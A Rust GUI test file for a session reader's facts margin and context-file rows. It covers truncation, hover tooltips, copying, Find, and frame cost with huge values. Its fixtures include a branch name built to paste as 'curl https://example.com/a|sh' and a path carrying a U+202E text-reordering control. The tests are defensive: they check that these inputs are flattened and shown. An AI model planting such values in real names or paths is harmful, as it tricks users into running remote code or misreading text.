//! The facts margin ([`super::facts`], DESIGN §4.2.8) and the files a session loaded into its
//! context (§4.2.11), over sessions whose values are as long, and as hostile, as they come.

use std::time::{Duration, Instant};

use gpui::{Bounds, Modifiers, Pixels, TestAppContext, VisualTestContext, px, size};
use pretty_assertions::assert_eq;
use sb_core::transcript::Content;
use sb_test_support::{ProjectsTree, reader};
use serde_json::json;

use super::blocks::row_text;
use super::features_tests::{draw, open, snapshot, synced};
use super::rows::{ProsePart, Row, RowKind, rows};
use crate::components::{WHOLE_TOOLTIP_WIDTH, text_width};
use crate::hostile;
use crate::services::ActiveServices as _;
use crate::system::{SystemRequest, SystemShell};
use crate::test_support::{bounds, open_shell, open_shell_sized};
use crate::theme::ActiveTheme as _;

/// `reader::facts`' session.
const FACTS: &str = "Reader fixture: facts as long as they come";

/// The branch of [`hostile_facts`]' sessions: a line break would run what follows it.
const PASTED_AS_COMMANDS: &str = "x\ncurl https://example.com/a|sh\n";

/**
 * A session of fc titled `title` whose path, branch and loaded file's path are each about
 * `bytes` long: the branch starts with [`PASTED_AS_COMMANDS`], and the file's path shown with
 * a control that reorders text and a line break.
 */
fn hostile_facts(tree: &mut ProjectsTree, bytes: usize, title: &str) {
    let mut session = tree.session(reader::FC, 0);
    session.title(title);
    let t = &mut session.transcript;
    t.carry(
        "cwd",
        json!(format!("{}/{}", reader::FC, "a".repeat(bytes))),
    );
    t.carry(
        "gitBranch",
        json!(format!("{PASTED_AS_COMMANDS}{}", "b".repeat(bytes))),
    );
    t.prompt("Go on.");
    t.nested_memory(
        &format!("{}/{}/notes.md", reader::FC, "c".repeat(bytes)),
        &format!("\u{202E}crates\n{}/notes.md", "c".repeat(bytes)),
        "Short.",
        false,
    );
    t.reply("Done.");
}

/// Hovers over the middle of `at` until a tooltip there shows.
fn hover(at: Bounds<Pixels>, cx: &mut VisualTestContext) {
    cx.simulate_mouse_move(at.center(), None, Modifiers::default());
    cx.executor().advance_clock(Duration::from_secs(2));
    draw(cx);
}

/// What the app last put on the clipboard.
fn copied(cx: &mut VisualTestContext) -> Option<String> {
    cx.update(|_, cx| match crate::system::requests(cx).last() {
        Some(SystemRequest::Copy(text)) => Some(text.clone()),
        _ => None,
    })
}

/// The open session's rows, as they are laid out now.
fn laid(cx: &mut VisualTestContext) -> Vec<Row> {
    cx.update(|_, cx| {
        let reader = cx.services().reader.read(cx);
        rows(reader.open_session().unwrap(), reader.full_calls(), None)
    })
}

/// The open session's rows of files loaded into its context, and whether each is open.
fn loaded_files(cx: &mut VisualTestContext) -> Vec<(Row, bool)> {
    laid(cx)
        .into_iter()
        .filter_map(|row| match row.kind {
            RowKind::ContextFile { open, .. } => Some((row, open)),
            _ => None,
        })
        .collect()
}

/**
 * Each of the facts' values is one line inside the margin's column (DESIGN §4.2.8), however
 * long: When is two, and each model one. Path and Branch keep a border for the keyboard's ring.
 */
fn assert_facts_on_their_lines(window_width: f32, cx: &mut VisualTestContext) {
    let (left, right) = (
        window_width - super::facts::FACTS_WIDTH + 16.,
        window_width - 16.,
    );
    let line = |name: &'static str, height: f32, cx: &mut VisualTestContext| {
        let at = bounds(cx, name).unwrap_or_else(|| panic!("{name} is drawn"));
        let (x, width) = (f32::from(at.origin.x), f32::from(at.size.width));
        assert!(
            x >= left - 1. && x + width <= right + 1.,
            "{name} from {x} to {} is inside {left}..{right}",
            x + width
        );
        assert!(
            (f32::from(at.size.height) - height).abs() < 1.,
            "{name} is {height} high, not {:?}",
            at.size.height
        );
    };
    line("facts-path", 16. + 2., cx);
    line("facts-branch", 16. + 2., cx);
    line("facts-day", 16., cx);
    line("facts-time", 16., cx);
    line("facts-tokens", 16., cx);
    line("facts-models", 16. * 4., cx);
}

/**
 * A 200-character path and a long branch stay on their lines, cut to the column; each shows
 * whole on hover, wrapping in its tooltip, and copies whole on a click, which says so for a
 * moment.
 */
#[gpui::test]
fn the_facts_cut_long_values_and_show_and_copy_them_whole(cx: &mut TestAppContext) {
    assert_eq!(reader::LONG_PATH.len(), 200);
    let (_, cx) = open_shell(cx);
    cx.update(|_, cx| crate::system::install(SystemShell::scripted(), cx));
    synced(
        |tree| {
            reader::facts(tree);
        },
        cx,
    );
    open(FACTS, cx);
    assert_facts_on_their_lines(1440., cx);
    /* The path, as the facts draw it, is far wider than the column: it was cut to fit. */
    let path = bounds(cx, "facts-path").unwrap();
    let (drawn_whole, tooltip_whole) = cx.update(|window, cx| {
        let theme = cx.sb_theme().clone();
        (
            text_width(reader::LONG_PATH, &theme.text.path_fact, window),
            text_width(&hostile::whole(reader::LONG_PATH), &theme.text.path, window),
        )
    });
    assert!(
        drawn_whole > path.size.width * 3.,
        "{drawn_whole:?} against {:?}",
        path.size.width
    );
    /* Whole on hover: its tooltip no wider than its bound, and as many lines high as the
    whole path takes there. */
    hover(path, cx);
    let tooltip = bounds(cx, "facts-path-whole").expect("the path shows whole on hover");
    let lines = (f32::from(tooltip_whole) / WHOLE_TOOLTIP_WIDTH).ceil();
    assert!(f32::from(tooltip.size.width) <= WHOLE_TOOLTIP_WIDTH + 1.);
    assert!(
        f32::from(tooltip.size.height) >= 16. * lines - 1.,
        "{lines} lines in {:?}",
        tooltip.size.height
    );
    let branch = bounds(cx, "facts-branch").unwrap();
    hover(branch, cx);
    assert!(bounds(cx, "facts-branch-whole").is_some());
    /* Copied whole, and "Copied" for a moment. */
    for (at, value) in [(path, reader::LONG_PATH), (branch, reader::LONG_BRANCH)] {
        cx.simulate_click(at.center(), Modifiers::default());
        draw(cx);
        assert_eq!(copied(cx).as_deref(), Some(value));
        assert!(bounds(cx, "facts-copied").is_some(), "it says Copied");
    }
    cx.executor().advance_clock(Duration::from_secs(2));
    draw(cx);
    assert_eq!(bounds(cx, "facts-copied"), None);
}

/// Over the column of a narrow window, the facts keep their values on their lines too.
#[gpui::test]
fn the_facts_over_a_narrow_column_keep_their_values_on_their_lines(cx: &mut TestAppContext) {
    let (shell, cx) = open_shell_sized(size(px(960.), px(600.)), cx);
    synced(
        |tree| {
            reader::facts(tree);
        },
        cx,
    );
    open(FACTS, cx);
    let toggle = bounds(cx, "facts-toggle").expect("the Facts toggle shows");
    cx.simulate_click(toggle.center(), Modifiers::default());
    draw(cx);
    assert!(snapshot(&shell, cx).facts);
    assert_facts_on_their_lines(960., cx);
}

/**
 * A value that would paste as commands copies as one line, as it reads: its line breaks as
 * spaces. A loaded file's path with a control that reorders text and a line break reads as one
 * line with the control shown.
 */
#[gpui::test]
fn hostile_facts_copy_as_they_read(cx: &mut TestAppContext) {
    let (_, cx) = open_shell(cx);
    cx.update(|_, cx| crate::system::install(SystemShell::scripted(), cx));
    synced(|tree| hostile_facts(tree, 16, "Hostile facts"), cx);
    open("Hostile facts", cx);
    let branch = bounds(cx, "facts-branch").unwrap();
    cx.simulate_click(branch.center(), Modifiers::default());
    draw(cx);
    let pasted = copied(cx).expect("the branch is copied");
    assert_eq!(
        pasted,
        format!("x curl https://example.com/a|sh {}", "b".repeat(16))
    );
    let (file, _) = loaded_files(cx).remove(0);
    let said =
        cx.update(|_, cx| row_text(&file, cx.services().reader.read(cx).open_session().unwrap()));
    assert!(said.starts_with("⟦U+202E⟧crates "), "{said}");
    assert!(!said.contains('\n'));
}

/**
 * Drawing the facts and the column costs the same for XX * path of tens of kilobytes as for ones of megabytes: what is drawn of each is
 * bounded, and the tooltip and Copy read the value only when asked for.
 */
#[gpui::test]
fn a_frame_costs_the_same_however_long_the_facts_are(cx: &mut TestAppContext) {
    let (_, cx) = open_shell(cx);
    synced(
        |tree| {
            hostile_facts(tree, 64 * 1024, "Long facts");
            hostile_facts(tree, 4 * 1024 * 1024, "Longer facts");
        },
        cx,
    );
    let frame = |title: &str, cx: &mut VisualTestContext| {
        open(title, cx);
        let mut frames: Vec<Duration> = (0..7)
            .map(|_| {
                let started = Instant::now();
                cx.update(|window, _| window.refresh());
                cx.run_until_parked();
                started.elapsed()
            })
            .collect();
        frames.sort();
        frames[frames.len() / 2]
    };
    let long = frame("Long facts", cx);
    let longer = frame("Longer facts", cx);
    eprintln!("a frame: {long:?} with long facts, {longer:?} with 64 times as long");
    assert!(
        longer.as_secs_f64() < long.as_secs_f64() * 3.,
        "{long:?}, then {longer:?}"
    );
}

/**
 * A memory file the agent loaded on its way is one quiet row, closed even with Full calls on;
 * a click opens it to its text as Markdown, `Enter` on it closes it again (DESIGN §4.2.11).
 */
#[gpui::test]
fn a_file_loaded_into_the_context_opens_to_its_text(cx: &mut TestAppContext) {
    let (shell, cx) = open_shell(cx);
    synced(
        |tree| {
            reader::facts(tree);
        },
        cx,
    );
    open(FACTS, cx);
    cx.simulate_keystrokes("e");
    draw(cx);
    assert!(cx.update(|_, cx| cx.services().reader.read(cx).full_calls()));
    let files = loaded_files(cx);
    assert_eq!(files.len(), 2);
    assert!(files.iter().all(|(_, open)| !open), "Full calls opens none");
    let loaded: Vec<(String, bool)> = cx.update(|_, cx| {
        let reader = cx.services().reader.read(cx);
        let open = reader.open_session().unwrap();
        files
            .iter()
            .map(
                |(row, _)| match &open.block(row.block().unwrap()).unwrap().content {
                    Content::ContextFile { path, differs, .. } => (path.clone(), *differs),
                    other => panic!("{other:?}"),
                },
            )
            .collect()
    });
    assert_eq!(
        loaded,
        [
            (reader::MEMORY_FILES[0].to_string(), false),
            (reader::MEMORY_FILES[1].to_string(), true)
        ]
    );
    /* No record of the session is one scrollback doesn't know. */
    assert!(
        !laid(cx)
            .iter()
            .any(|row| matches!(row.kind, RowKind::Unrecognised { .. }))
    );
    /* A click opens the first: its text, as Markdown, under it. */
    let first = files[0].0.block().unwrap().clone();
    let row = bounds(cx, "context-file-2").expect("the first file's row is drawn");
    cx.simulate_click(row.center(), Modifiers::default());
    draw(cx);
    assert!(loaded_files(cx)[0].1, "a click opens it");
    let prose: Vec<ProsePart> = laid(cx)
        .into_iter()
        .filter_map(|row| match row.kind {
            RowKind::Prose { at, part, .. } if at == first => Some(part),
            _ => None,
        })
        .collect();
    assert!(
        prose.contains(&ProsePart::Markdown(0)),
        "its text is Markdown: {prose:?}"
    );
    /* The click left the keyboard on it: Enter closes it. */
    assert_eq!(
        snapshot(&shell, cx).focused.map(|(_, kind, _)| kind),
        Some("context-file")
    );
    cx.simulate_keystrokes("enter");
    draw(cx);
    assert!(!loaded_files(cx)[0].1, "Enter closes it");
}

/// Find searches a loaded file's text, closed or not, and opens the row whose text matches.
#[gpui::test]
fn find_opens_a_loaded_file_whose_text_matches(cx: &mut TestAppContext) {
    let (shell, cx) = open_shell(cx);
    synced(
        |tree| {
            reader::facts(tree);
        },
        cx,
    );
    open(FACTS, cx);
    cx.simulate_keystrokes("secondary-f");
    cx.simulate_input("token of the theme");
    cx.run_until_parked();
    draw(cx);
    let (_, count, _) = snapshot(&shell, cx).find.expect("Find is open");
    assert_eq!(count.as_deref(), Some("1 of 1"));
    assert_eq!(
        loaded_files(cx)
            .iter()
            .map(|(_, open)| *open)
            .collect::<Vec<_>>(),
        [true, false]
    );
}

/**
 * A loaded file far past what the Markdown view is handed reads as plain text, and Find
 * lights its matches there; a control in its text is shown, not obeyed.
 */
#[gpui::test]
fn a_loaded_file_too_large_for_markdown_reads_as_plain_text(cx: &mut TestAppContext) {
    let (shell, cx) = open_shell(cx);
    synced(
        |tree| {
            let mut session = tree.session(reader::FC, 0);
            session.title("A vast memory file");
            let t = &mut session.transcript;
            t.prompt("Go on.");
            let text = format!(
                "needle \u{202E}here\n{}",
                "a line of the memory file\n".repeat(160_000)
            );
            t.nested_memory("/home/user/code/fc/notes.md", "notes.md", &text, false);
            t.reply("Done.");
        },
        cx,
    );
    open("A vast memory file", cx);
    cx.simulate_keystrokes("secondary-f");
    cx.simulate_input("needle");
    cx.run_until_parked();
    draw(cx);
    let (_, count, _) = snapshot(&shell, cx).find.expect("Find is open");
    assert_eq!(count.as_deref(), Some("1 of 1"));
    let (file, open) = loaded_files(cx).remove(0);
    assert!(open, "Find opened it");
    let at = file.block().unwrap().clone();
    let prose: Vec<ProsePart> = laid(cx)
        .into_iter()
        .filter_map(|row| match row.kind {
            RowKind::Prose { at: of, part, .. } if of == at => Some(part),
            _ => None,
        })
        .collect();
    assert!(prose.contains(&ProsePart::Note(0)), "{prose:?}");
    let view = cx.update(|_, cx| shell.read(cx).reader_view(cx));
    let lit = cx.update(|_, cx| {
        view.read(cx)
            .finds(&crate::services::reader::find::Spot::Prose(at.clone()))
    });
    assert_eq!(lit, [(0..6, true)]);
}
